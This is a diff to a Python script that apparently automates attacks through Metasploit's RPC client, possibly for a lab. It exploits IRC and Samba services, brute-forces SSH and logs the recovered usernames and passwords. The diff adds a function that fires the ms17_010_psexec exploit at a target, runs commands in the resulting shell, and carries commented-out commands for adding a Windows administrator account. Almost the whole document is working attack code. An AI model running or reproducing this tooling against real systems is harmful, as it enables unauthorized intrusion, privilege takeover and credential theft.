@@ -53,12 +53,16 @@ def irc_attack(target_ip, host_ip):
                                 shell = client.sessions.session(key)
                                 shell.write('whoami')
                                 access = shell.read()
+                                shell.write('ls')
+                                prompt = shell.read()
                                 print("access", access)
                                 print("access.strip() == 'root'", access.strip() == 'root')
                                 if access.strip() != '':
                                     if overall_access != 'root':
                                         overall_access = access.strip()
                                     file_string = file_string + "\nIRC Attack is Successful with Exploit Module =>" + exploit_name + " and Payload => " + payload_name + "and " + access.strip() + " privilege"
+                                    file_string = file_string + "\n name of dictionary of target systm are : \n" + prompt
+
 
 
         except:
@@ -70,6 +74,7 @@ def irc_attack(target_ip, host_ip):
     print("overall_access", overall_access)
     if overall_access == 'root':
         file_string = file_string + "\nbuffer overflow attack on IRC service is success with root Privilege"
+    file_string = file_string + "\n finished buffer overflow attack on IRC service"
     file_string = file_string + "\n-----------------------"
     write_on_file(file_string)
     return overall_access
@@ -119,11 +124,14 @@ def samba_attack(target_ip, host_ip):
                                 shell = client.sessions.session(key)
                                 shell.write('whoami')
                                 access = shell.read()
+                                shell.write('ls')
+                                prompt = shell.read()
                                 print("access", access)
                                 if access.strip() != '':
                                     if overall_access != 'root':
                                         overall_access = access.strip()
-                                    file_string = file_string + "\nSamba Attack is Successful with Exploit Module =>" + exploit_name + " and Payload => " + payload_name
+                                    file_string = file_string + "\nSamba Attack is Successful with Exploit Module =>" + exploit_name + " and Payload => " + payload_name + "and " + access.strip() + " privilege"
+                                    file_string = file_string + "\n name of dictionary of target system are : \n" + prompt
 
         except:
             print("connection refused by the server..")
@@ -132,9 +140,11 @@ def samba_attack(target_ip, host_ip):
             print('continue....')
             continue
 
+
     print("overall_access", overall_access)
     if overall_access == 'root':
         file_string = file_string + "\nbuffer overflow attack on Samba service is success"
+    file_string = file_string + "\n finished buffer overflow attack on Samba service"
     file_string = file_string + "\n-----------------------"
     write_on_file(file_string)
     return overall_access
@@ -195,6 +205,7 @@ def ssh_password_attack_with_ssh_login(target_ip, host_ip):
     print("overall_access == 'root'", overall_access == 'root')
     if overall_access == 'root':
         file_string = file_string + "\nssh password attack on ssh service is success with root Privilege"
+    file_string = file_string + "\n finished SSH Password attack"
     file_string = file_string + "\n-----------------------"
     write_on_file(file_string)
     return overall_access, password, username
@@ -250,7 +261,7 @@ def ssh_password_attack(target_ip, host_ip):
                                 username = user_password[0].replace('(', '')
                                 password = user_password[1].replace('(', '')
                                 if access.strip() == 'root' or access.strip() != '':
-                                    file_string = file_string + "\n ssh password Attack is Successful with " + access.strip() + " Privilege using Exploit Module =>" + auxiliary_name
+                                    file_string = file_string + "\n ssh password Attack is Successful with " + access.strip() + " Privilege using Exploit Module =>" + module_name
                                     file_string = file_string + "\n ssh username: " + username + " password : " + password
                                     if overall_access != 'root':
                                         overall_access = access.strip()
@@ -266,9 +277,69 @@ def ssh_password_attack(target_ip, host_ip):
     print("overall_access", overall_access)
     if overall_access == 'root':
         file_string = file_string + "\nssh password attack on ssh service is success with root privilege"
+    file_string = file_string + "\n finished SSH Password attack"
     file_string = file_string + "\n-----------------------"
     write_on_file(file_string)
     return overall_access, username, password
+
+def smb_attack(target_ip, host_ip):
+    overall_access = ''
+    file_string = "\nstarting buffer overflow attack on samba service..."
+    client = ''
+    while client == '':
+        try:
+            client = MsfRpcClient("fateFATE13", port=55553, ssl=True)
+            search_result = client.modules.search("ms17-010")
+            for result in search_result:
+                print(result)
+                print(result['rank'])
+                if result['fullname'] == "exploit/windows/smb/ms17_010_psexec":
+                    module_name = result["fullname"]
+                    print(f"exploit name is : {module_name}")
+                    auxiliary = client.modules.use('exploit', module_name)
+                    auxiliary['RHOSTS'] = target_ip
+                    # if 'COMMAND' in auxiliary.options:
+                    #     auxiliary['COMMAND'] = "net user user password /add"
+                    count = 1
+                    result = auxiliary.execute()
+                    # if 'COMMAND' in auxiliary.options:
+                    #     auxiliary['COMMAND'] = "net localgroup 'administrators' user /add"
+                    print("final_result", result)
+                    print("client.sessions.list", client.sessions.list)
+                    count += 1
+                    if (len(client.sessions.list) > 0):
+                        print("key", client.sessions.list.keys())
+                        for key in client.sessions.list.keys():
+                            print(key)
+                            # auxiliary['COMMAND'] = "net localgroup administrator user /add"
+                            # final_result = auxiliary.execute()
+                            print("client.sessions.list[key]", client.sessions.list[key])
+                            shell = client.sessions.session(key)
+                            shell.write('getuid')
+                            access = shell.read()
+                            shell.write('ls')
+                            prompt = shell.read()
+                            print("access", access)
+                            if access.strip() != '':
+                                if overall_access != 'root':
+                                    overall_access = access.strip()
+                                file_string = file_string + "\nSamba Attack is Successful with Exploit Module =>" + module_name + "and " + access.strip() + " privilege"
+                                file_string = file_string + "\n name of dictionary of target system are : \n" + prompt
+
+        except:
+            print("connection refused by the server..")
+            print("sleep for 5 seconds")
+            time.sleep(5)
+            print('continue....')
+            continue
+
+    print("overall_access", overall_access)
+    if overall_access == 'root':
+        file_string = file_string + "\nbuffer overflow attack on Samba service is success"
+    file_string = file_string + "\n finished buffer overflow attack on Samba service"
+    file_string = file_string + "\n-----------------------"
+    write_on_file(file_string)
+    return overall_access
 
 
 # irc_attack('192.168.10.7','192.168.10.6')
